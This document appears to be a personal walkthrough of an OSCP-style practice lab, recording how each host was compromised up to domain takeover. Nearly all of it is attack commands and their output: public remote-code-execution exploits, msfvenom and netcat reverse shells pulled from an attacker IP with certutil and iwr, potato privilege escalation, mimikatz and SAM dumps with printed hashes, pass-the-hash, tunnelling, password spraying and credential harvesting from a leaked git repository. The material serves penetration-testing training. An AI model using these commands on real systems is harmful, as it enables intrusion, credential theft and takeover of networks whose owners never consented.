

### Enumeration

```bash

# Do a port scan on the targets
sudo nmap -p- -sS -sV -sC -Pn -iL info/targets.txt --open -oN nmap/targets.nmap

# Do a UDP scan on most common targets
sudo nmap -sU --max-scan-delay 10ms --max-retries 1 --max-rtt-timeout 200ms  --top-ports 1075 <target>

```

### .141

```bash

# Port 80
/script
	GPO.ps1

# Port 81
/admin

# GOOGLE title of web page + exploit !!!!
Attendance and Payroll system exploit
	Attendance and Payroll System v1.0 - Remote Code Execution (RCE)
	Attendance and Payroll System v1.0 - SQLi Authentication Bypass

# Run the exploit: Attendance and Payroll System v1.0 - Remote Code Execution (RCE)
# Edit the line for upload_path and shell_path
python3 50801.py http://192.168.233.141:81
whoami
	ms01\mary.williams

# Stabalize the shell with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=5555 -f exe -o revshell.exe
certutil -urlcache -f http://192.168.45.216:8000/revshell.exe revshell.exe
.\revshell.exe

# Run winpeas
	SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
	
	Some AutoLogon credentials were found
	DefaultDomainName             :  oscp.exam
	DefaultUserName               :  celia.almeda
	
	Possible DLL Hijacking in binary folder: c:\wamp64\bin\apache\apache2.4.51\bin
	Possible DLL Hijacking in binary folder: c:\wamp64\bin\mariadb\mariadb10.6.5\bin
	Possible DLL Hijacking in binary folder: c:\wamp64\bin\mysql\mysql5.7.36\bin
	
	Modifiable path: c:\wamp64
	
	Found intresting file earlier: File Permissions C:\wamp64\www\Script\GPO.ps1
	
# Exploit pricEsc SeImpersonatePrivilege
# Don't use godpotato it's garbage!!
# Use SweetPotato
.\sweetpotato.exe -a "C:\users\Mary.williams\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.216 1234"
whoami
	nt authority\system
	
# Run mimikatz
sekurlsa::logonpasswords
lsadump::sam
	celia.almeda
	e728ecbadfb02f51ce8eed753f3ff3fd
	
	Mary.Williams
	9a3121977ee93af56ebd0ef4f527a35e
	
	support
	d9358122015c5b159574a88b3c0d2071
	
	Administrator
	3c4495bbd678fac8c9d218be4f2bbc7b
	
# Crack the password hashes
support
	Freedom1

Administrator
	December31

# Run bloodhound
# Import the module
powershell -ep bypass
Import-Module .\Sharphound.ps1

# We must first run invoke-bloodhound
# Get-help shows more info
Get-Help Invoke-BloodHound

# Collect all data available
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\mary.williams\ -OutputPrefix "corp audit"

# Start bloodhound
sudo neo4j start 
bloodhound

# Save down all computers and users
MATCH (m:User) RETURN m
MATCH (m:Computer) RETURN m

# Set up the Ligolo tunnel network on Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Start the proxy
./proxy -selfcert -laddr 0.0.0.0:443 

# Transfer the agent to the target and connect to the proxy
iwr 192.168.45.180:8000/agent.exe -outfile agent.exe
.\agent.exe -connect 192.168.45.216:443 -ignore-cert

# Start the connection in ligolo
session
ifconfig
start

# Check that the interface is up
ip a show ligolo

# Add IP to routing table on Kali
sudo ip route add 10.10.174.0/24 dev ligolo

# Password spray for all services! With username/password and hashes found
# The one that was fruitfull
netexec winrm info/targets.txt -u info/usernames.txt -H e728ecbadfb02f51ce8eed753f3ff3fd -d oscp.exam --continue-on-success
	WINRM   10.10.174.142   5985   MS02   oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
	
# Connect to .142
evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd

# Set up chisel instead of ligolo (FW seems to block file transfers)
# Kali
1. ./chisel server -p 8080 --reverse
4. proxychains evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd

# Tagret
2. iwr 192.168.45.216:80/chisel.exe -outfile chisel.exe
3. .\chisel.exe client 192.168.45.216:8080 R:socks

```

### .142 (Internal)

```bash

# Move lateral from .141 to .142
evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd

# Not possible to transfer files, FW seems to block
# Go back to .141 and set up chisel instead of ligolo
proxychains evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd

# Upload winpeas (evil-winrm function)
upload /home/kali/Projects/Offsec/Challenges/OSCP_A/winpeas.exe C:\Users\celia.almeda\winpeas.exe

# Found suspicious dir in C:\windows.old
# Somehow I am supposed to find the SAM file
# Originally this file is protected and not accessible outside reg hive as admin

# Donwload the SAM & SYSTEM file to Kali (evil-winrm function)
download C:\windows.old\windows\system32\SYSTEM /home/kali/Projects/Offsec/Challenges/OSCP_A/SYSTEM
download C:\windows.old\windows\system32\SAM /home/kali/Projects/Offsec/Challenges/OSCP_A/SAM

# Dump the hashes of the SAM file
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Add to info/creds

# Try to crack hashes
# No success

# Pass the hash
proxychains netexec smb info/targets.txt -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam --continue-on-success
	10.10.174.140   445    DC01  oscp.exam\tom_admin:49.. (Pwn3d!)

proxychains impacket-psexec tom_admin@10.10.174.140 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
whoami
	nt authority\system
	


```

### .140 (Internal)

```bash

# Owned through .142
proxychains impacket-psexec tom_admin@10.10.174.140 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
whoami
	nt authority\system
	

# DOMAIN OWNED

```


### .143

```bash

# Port 80
/sub
	Pico		
	
# Port 81
Nginx
	
# Known exploits for pico (Dead end)
# Fuzzed and found /api
# /api/heartbeat
	serviceName	"aerospike"

# Check for known  exploits
searchsploit aerospike
	Aerospike Database 5.1.0.3 - OS Command Execution
	
# First tried the exploit from searchsploit but did not work
# Found this other version on Git
https://github.com/b4ny4n/CVE-2020-13151

# Exploit and get a shell
python3 cve2020-13151.py --ahost 192.168.214.143 --pythonshell --lhost=192.168.45.216 --lport=80
whoami
	aero
	
cat /home/aero/local.txt
f558b1bc26edb59a28ab21f1b8b20c75

# Run linpeas
	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
	
	#Cron jobs
	SHELL=/bin/sh
	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

	17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
	25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
	47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
	52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
	*/1 * * * * root /root/aerospike.sh
	
	#Users:
	aero:x:1000:1000:aero:/home/aero:/bin/bash
	aerospike:x:997:998:Aerospike server:/opt/aerospike:/bin/sh
	postgres:x:114:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
	root:x:0:0:root:/root:/bin/bash
	
	#Write access:
	/etc/cron.d

# Found PE exploit screen
# But can't get it to work yet..
# Problem with gcc compiler, does not work from kali
# Tried different exploits but got this to work:
https://github.com/XiphosResearch/exploits/tree/master/screen2root

# Had to change the epxloit to use gcc-9 instead of gcc whcih was installed on the target

cat proof.txt
c85a498176ba8e4218b035dd1421be06

# Was supposed to be another PE path
# Run pspy64 and look for intresting stuff
# Could not find anything?



```

### .144

```bash

# Port 80
	Apache, Ubuntu, Nicepage, WYSIWYG
	/cms
	Joomla
	

# Multipole known exploits for service wysiwyg
# Multipole known exploits for service Joomla

# Running nmap with the sC (script) flag on found /.git repo
http://192.168.214.144/.git/

# Dump the git repo
git-dumper http://192.168.214.144/.git/ .

# Try to grep for intresting strings
grep -r cred .
	./configuration/database.php:// Cleartext creds cannot be added to public repos!
	
# Check the git logs
git log
	commit 621a2e79b3a4a08bba12effe6331ff4513bad91a
	Create database.php
	
git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
	+    private $db_name = "staff";
	+    private $username = "stuart@challenge.lab";
	+    private $password = "BreakingBad92";
	
# SSH in to the machine
ssh stuart@192.168.214.144
	BreakingBad92

# Run linpeas
Processes with credentials in memory (root req)
	vsftpd process found (dump creds from memory as root)
	apache2 process found (dump creds from memory as root)
	sshd: process found (dump creds from memory as root)
	
Users with console
	carla:x:1012:1012::/home/carla:/bin/bash
	chloe:x:1011:1011::/home/chloe:/bin/bash
	root:x:0:0:root:/root:/bin/bash
	stuart:x:1000:1000:CClNW:/home/stuart:/bin/bash
	thato:x:1010:1010::/home/thato:/bin/bash
	
Analyzing FTP Files (limit 70)
	anonymous_enable
	local_enable
	write_enable
	anon_upload_enable
	anon_mkdir_write_enable

Analyzing Other Interesting Files (limit 70)
	/home/stuart/.sudo_as_admin_successful
	
Readable files belonging to root and readable by me but not world readable
	-rw-r----- 1 root adm 22468 Nov 22  2022 /var/log/dmesg.2.gz
	-rw-r----- 1 root adm 22424 Nov 18  2022 /var/log/dmesg.3.gz
	-rw-r----- 1 root adm 13764 Jun 27 09:56 /var/log/cloud-init-output.log
	-rw-r----- 1 root adm 108168 Nov 22  2022 /var/log/dmesg.0
	-rw-r----- 1 root adm 108065 Jun 27 09:56 /var/log/dmesg
	-rw-r----- 1 root adm 22328 Nov 22  2022 /var/log/dmesg.1.gz
	-rw-r----- 1 root adm 25412 Aug  6 07:05 /var/log/apache2/access.log
	-rw-r----- 1 root adm 601 Nov 22  2022 /var/log/apache2/error.log.2.gz
	-rw-r----- 1 root adm 0 Nov 18  2022 /var/log/apache2/other_vhosts_access.log
	-rw-r----- 1 root adm 11047 Nov 22  2022 /var/log/apache2/access.log.1
	-rw-r----- 1 root adm 438 Aug  6 06:59 /var/log/apache2/error.log
	-rw-r----- 1 root adm 585 Aug  6 06:58 /var/log/apache2/error.log.1
	

# Search for .zip files 
# Check /opt/
ls -lat /opt/
	backup
find  / -name *.zip* 2>/dev/null
	/opt/backup/sitebackup1.zip
	/opt/backup/sitebackup3.zip
	/opt/backup/sitebackup2.zip

# Only sitebackup3.zip is a zip file (other files are data type)
# Copy the zip to kali
scp stuart@192.168.214.144:/opt/backup/sitebackup3.zip .

# Crack the file with john
zip2john sitebackup3.zip > sitebackup3.hash
john --wordlist=/usr/share/wordlists/rockyou.txt sitebackup3.hash
	codeblue

# Grep for intresting strings
grep -r -i pass .
grep -r -i secret .
grep -r -i user .
grep -r -i cred .

# Check the file
cat ./configuration.php
	public $user = 'joomla';
	public $password = 'Password@1';
	public $secret = 'Ee24zIK4cDhJHL4H';
	
# Save to /info

# Password spary for all open services (SSH and FTP)
netexec ftp 192.168.214.144 -u usernames.txt -p passwords.txt
	FTP  192.168.214.144 21   192.168.214.144 chloe:Ee24zIK4cDhJHL4H
	
# Download all files from the FTP server
# FTP dir is empty however
wget -m ftp://chloe:Ee24zIK4cDhJHL4H@192.168.214.144

# WAS NOT POSSIBLE TO SSH TO CHLOE but REMEBER TO TRY USING SU also!!
su chloe
	Ee24zIK4cDhJHL4H

sudo -l
	User chloe may run the following commands on oscp:
    (ALL : ALL) ALL

sudo cat /root/proof.txt
9d157d578202a92f7b18504926665492


```

### .145

```bash

# Port 80
Windows, IIS 10.0

# Port 161 SNMP open
Tried to do a snmp walk

# Bruteforce the community string
python3 snmpbrute.py -t 192.168.214.145 -f /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt

# Run SNMP walk
snmpwalk -v2c -c public 192.168.214.145
# Did not find anything intresting more than
	iso.3.6.1.2.1.1.4.0 = STRING: "zachary"
	iso.3.6.1.2.1.1.5.0 = STRING: "oscp"

# Port 1978 open google for exploit
# found exploit https://www.exploit-db.com/exploits/49601
python2 49601.py 192.168.214.145 192.168.45.216:80 revshell.exe
nc -nvlp 443
whoami
	oscp\offsec
	
# Run winpeas
# Tried exploit CVE-2020-1013 WSUS Attacks (No success)

Access to run:
	File: C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
	File: C:\Program Files (x86)\Mouse Server\MouseServer.exe

Password found for user Zachary
	Putty Sessions
    RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"

# RDP to zachary
xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:192.168.214.145 /u:"zachary" /p:'Th3R@tC@tch3r'

cat C:\users\administrator\desktop\proof.txt
09c392fbe82a0755f0f5a82e01636f44


```

# ALL FUCKING DONE!